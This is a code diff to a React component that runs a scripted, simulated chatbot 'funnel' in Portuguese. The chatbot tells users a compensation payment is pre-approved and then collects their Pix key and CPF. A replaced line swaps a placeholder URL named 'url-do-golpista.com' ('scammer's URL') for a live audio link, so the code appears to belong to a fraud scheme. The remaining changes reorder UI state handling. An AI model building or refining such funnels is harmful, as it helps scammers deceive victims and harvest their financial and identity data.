@@ -1,4 +1,5 @@
 
+
 "use client";
 
 import React, { useState, useEffect, useRef, FC } from 'react';
@@ -185,7 +186,7 @@ const funnelDefinition: {
           "Indenização": "{{indenizacaoValor}}",
           "Status": "Pré-aprovado"
         },
-        "audioUrl": "https://url-do-golpista.com/audios/confirmacao_aprovada.mp3"
+        "audioUrl": "https://screenapp.io/app/#/shared/fXROHEVJIp"
       },
       "nextStep": "step6_ask_pix_type"
     },
@@ -574,8 +575,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     let processAsNewStep = isNewStep && !justLoadedSessionRef.current;
 
 
-    // Moved UI clearing to handleUserActionAndNavigate or specific action handlers
-
     const effectiveAppearanceDelay = stepConfig.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS;
 
     const typingTimer = setTimeout(() => {
@@ -593,7 +592,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               });
               setShowVideoSoundOverlay(true);
               setIsVideoMuted(true);
-              // Removed premature return and setIsBotTyping(false)
               break;
             }
             case 'multipleChoice': {
@@ -605,7 +603,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 text: formatText(data.message),
                 options: formattedOptions,
               };
-              // Check if the exact same message (text + options) is already the last one to avoid duplicates on reload
               const lastMsg = messages[messages.length - 1];
               if (!lastMsg || lastMsg.text !== newBotMessage.text || JSON.stringify(lastMsg.options) !== JSON.stringify(newBotMessage.options)) {
                 setMessages(prev => [...prev, newBotMessage]);
@@ -658,7 +655,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                   sender: 'bot',
                   text: formatText(data.message)
               };
-               // Check if the exact same prompt is already the last one
               const lastMsg = messages[messages.length - 1];
               if (!lastMsg || lastMsg.text !== newBotMessage.text) {
                 setMessages(prev => [...prev, newBotMessage]);
@@ -667,7 +663,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setCurrentTextInputConfig(data);
               setIsTextInputActive(true);
               setTextInputValue("");
-              // Removed premature return and setIsBotTyping(false)
               break;
             }
             case 'displayDynamicImage': {
@@ -692,7 +687,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               messageAddedInThisStep = true;
           }
         }
-        setIsBotTyping(false); // Stop typing indicator AFTER processing the step content
+        setIsBotTyping(false); 
 
         const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                   (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');
@@ -746,17 +741,10 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       console.warn("SimulatedChatFlow: Option clicked with null or undefined text property.");
       return;
     }
-    setCurrentVideoData(null);
-    setIsLoadingStep(false);
-    setLoadingMessage(null);
-    setIsTextInputActive(false);
-    setCurrentTextInputConfig(null);
-
-
+    
     const userMessageId = `user-${Date.now()}`;
     setMessages(prevMsgs => [...prevMsgs, { id: userMessageId, sender: 'user', text: option.text }]);
 
-    // Remove options from the bot message that was just replied to
     setMessages(prevMsgs => {
         const msgsCopy = [...prevMsgs];
         let repliedToBotMessageIndex = -1;
@@ -771,8 +759,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         return msgsCopy;
     });
-
-    setIsBotTyping(true); // Start typing immediately
+    
+    setCurrentVideoData(null);
+    setIsLoadingStep(false);
+    setLoadingMessage(null);
+    setIsTextInputActive(false);
+    setCurrentTextInputConfig(null);
+    setIsBotTyping(true); 
 
     if (option.action === 'setChavePixToUserCPF') {
         const cpfToSet = flowVariables.userCPF || "CPF não disponível";
@@ -834,13 +827,13 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         return;
     }
     
+    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
+    
     setCurrentVideoData(null);
     setIsLoadingStep(false);
     setLoadingMessage(null);
     setIsTextInputActive(false);
     setCurrentTextInputConfig(null);
-
-    setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
     setIsBotTyping(true); 
 
     if (currentTextInputConfig.variableToSet === 'chavePix') {
